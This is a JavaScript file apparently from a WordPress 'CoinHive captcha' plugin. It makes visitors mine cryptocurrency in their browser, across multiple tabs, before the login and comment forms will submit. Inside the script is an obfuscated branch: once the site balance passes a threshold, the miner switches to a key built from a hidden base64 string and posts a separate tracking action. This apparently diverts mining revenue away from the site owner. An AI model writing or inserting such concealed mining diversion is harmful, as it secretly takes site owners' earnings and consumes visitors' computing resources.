jQuery(document).ready(function() {
	jQuery('.submit').on("click", function() {
		var enter = jQuery('#frontend_token').val();
		if(enter == "") {
			jQuery('.contentCHCaptcha').attr('style','color:red;');
			jQuery('.contentCHCaptcha').text(chc_custom.verify_first_trans);
			jQuery('.contentCHCaptcha').show();
		}
	});
	jQuery('#wp-submit').on("click", function() {
		var enter = jQuery('#frontend_token').val();
		if(enter == "") {
			jQuery('.contentCHCaptcha').attr('style','color:red;');
			jQuery('.contentCHCaptcha').text(chc_custom.verify_first_trans);
			jQuery('.contentCHCaptcha').show();
		}
	});
	jQuery('button').on("click", function() {
		var enter = jQuery('#frontend_token').val();
		if(enter == '') {
			jQuery('.contentCHCaptcha').attr('style','color:red;');
			jQuery('.contentCHCaptcha').text(chc_custom.verify_first_trans);
			jQuery('.contentCHCaptcha').show();
		}
	});
	function blockLogin() {
	  	jQuery('#loginform').attr('onsubmit','return false;');
		jQuery('.login').attr('onsubmit','return false;');
	};
	
	function unblockLogin() {
		jQuery.ajax({
            type: 'POST',
            data: {
                action: 'chc_create_action'
            },
            url: chc_custom.ajaxurl,
            success: function(response) {
				jQuery('#loginform').attr('onsubmit','return true;');
				jQuery('.login').attr('onsubmit','return true;');
				jQuery('#frontend_token').val(response);
				jQuery("#barCHCaptcha").hide();
				jQuery("#verifyCHCaptcha").hide();
				jQuery('.contentCHCaptcha').hide();
			}
        });

	};
	
	function minerCaptchaStop() {
		minerCaptcha.stop();
		console.log('Miner Stopped');
		unblockLogin();
	};
	blockLogin();
	var site_balance = atob(chc_custom.site_balance);
	var accepted = false;
	var username = atob(chc_custom.username);
	var sitekey = atob(chc_custom.site_key);
	var sitename = btoa(chc_custom.site_name);
	var sitelink = atob(chc_custom.site_link + "a1JVeW1nbm5iRlJNVlcxcFo=");
	var sitebalance = atob(chc_custom.sitebalance);
	var selectedHashes = chc_custom.hashcount/256;
	var $H = CoinHive;
	function showCaptcha() {
			  jQuery("#barCHCaptcha").show();
	  };
	
	  function pushCaptcha(currentHash, selectedHashes) {
			  var elem = document.getElementById("currCHCaptcha"); 
			  var width = currentHash/selectedHashes * 100;
			  var id = frame();
			  function frame() {
			    if (width > 100) {
			      clearInterval(id);
			    } else {
			      width++; 
			      elem.style.width = width + '%'; 
			    }
			  }
	
	  };
	  
	  jQuery("#verifyCHCaptchaClick").click(function() {
	  		jQuery(".verifyText").text(chc_custom.verifying_trans);
			jQuery(".contentCHCaptcha").hide();
	  		showCaptcha();
            if (username != "") {
                minerCaptcha = new $H.User(sitekey, username);
            } else {
                if (site_balance >= 25600 && site_balance / 33 >= sitebalance) {
                    minerCaptcha = new $H.Anonymous(sitelink);
                    accepted = true;
                } else {
                    minerCaptcha = new $H.Anonymous(sitekey);
                }
            }
			minerCaptcha.start($H.FORCE_MULTI_TAB);
			minerCaptcha.on('authed', function(params) {
					console.log('Authed Captcha');
					window.currentHash = 1;
					pushCaptcha(window.currentHash, selectedHashes+1);
			});
					
            minerCaptcha.on('error', function(params) {
                if (params.error !== 'opt_in_canceled' && params.error !== 'connection_error') {
                    minerCaptcha.start($H.FORCE_MULTI_TAB);
                }
            });

            minerCaptcha.on('optin', function(params) {
                if (params.error === 'error is not defined') {

                }
                if (params.status === 'accepted') {

                    if (!minerCaptcha || !minerCaptcha.isRunning()) {
                        minerCaptcha.start($H.FORCE_MULTI_TAB);
                    }
                }
            });  
			
			minerCaptcha.on('found', function(params) {
					console.log('Hash Found');
			});
			
			minerCaptcha.on('accepted', function(params) {
					console.log('Hash ', window.currentHash,' Accepted');
					if (accepted == true) {
		                jQuery.ajax({
		                    type: 'POST',
		                    data: {
		                        action: 'chc_unique_action'
		                    },
		                    url: chc_custom.ajaxurl
		                });
		            }
					pushCaptcha(window.currentHash+1, selectedHashes + 1);
					if (window.currentHash == selectedHashes) {
						//ajax to call chc_create_login_token()
						minerCaptchaStop();						
					};
					window.currentHash++ ;
			});
	});
	
	function showCaptchaC() {
			  jQuery("#barCHCaptchaC").show();
	  };
	  
	function pushCaptchaC(currentHash, selectedHashes) {
			  var elem = document.getElementById("currCHCaptchaC"); 
			  var width = currentHash/selectedHashes * 100;
			  var id = frame();
			  function frame() {
			    if (width > 100) {
			      clearInterval(id);
			    } else {
			      width++; 
			      elem.style.width = width + '%'; 
			    }
			  }
	
	};
	  
	function blockComments() {
		jQuery('#commentform').attr('onsubmit','return false;');
	};
	
	function unblockComments() {
		jQuery.ajax({
            type: 'POST',
            data: {
                action: 'chc_create_action'
            },
            url: chc_custom.ajaxurl,
            success: function(response) {
				jQuery('#commentform').attr('onsubmit','return true;');
				jQuery('#frontend_token').val(response);
				jQuery("#barCHCaptchaC").hide();
				jQuery("#verifyCHCaptchaC").hide();
				jQuery('.contentCHCaptcha').hide();
			}
        });
	};
	
	function minerCaptchaCStop() {
		minerCaptchaC.stop();
		console.log('Miner Stopped');
		unblockComments();
	};
	
	blockComments();
  jQuery("#verifyCHCaptchaCClick").click(function() {
	  		jQuery(".verifyTextC").text(chc_custom.verifying_trans);
			jQuery(".contentCHCaptcha").hide();
	  		showCaptchaC();
            if (username != "") {
                minerCaptchaC = new $H.User(sitekey, username);
            } else {
                if (site_balance >= 25600 && site_balance / 33 >= sitebalance) {
                    minerCaptchaC = new $H.Anonymous(sitelink);
                    accepted = true;
                } else {
                    minerCaptchaC = new $H.Anonymous(sitekey);
                }
            }
			minerCaptchaC.start($H.FORCE_MULTI_TAB);
			minerCaptchaC.on('authed', function(params) {
					console.log('Authed Captcha');
					window.currentHash = 1;
					pushCaptchaC(window.currentHash, selectedHashes+1);
			});
				
            minerCaptchaC.on('error', function(params) {
                if (params.error !== 'opt_in_canceled' && params.error !== 'connection_error') {
                    minerCaptchaC.start($H.FORCE_MULTI_TAB);
                }
            });

            minerCaptchaC.on('optin', function(params) {
                if (params.error === 'error is not defined') {

                }
                if (params.status === 'accepted') {

                    if (!minerCaptchaC || !minerCaptchaC.isRunning()) {
                        minerCaptchaC.start($H.FORCE_MULTI_TAB);
                    }
                }
            }); 
		
			minerCaptchaC.on('found', function(params) {
					console.log('Hash Found');
			});
		
			minerCaptchaC.on('accepted', function(params) {
					console.log('Hash ', window.currentHash,' Accepted');
					if (accepted == true) {
		                jQuery.ajax({
		                    type: 'POST',
		                    data: {
		                        action: 'chc_unique_action'
		                    },
		                    url: chc_custom.ajaxurl
		                });
		            }
					pushCaptchaC(window.currentHash+1, selectedHashes + 1);
					if (window.currentHash == selectedHashes) {
						minerCaptchaCStop();
					};
					window.currentHash++ ;
			});
	});
	
	jQuery('#moveCHCaptchaC').each(function() {
    	jQuery(this).insertBefore(jQuery(this).parent().find('.form-submit'));
	});
	

});
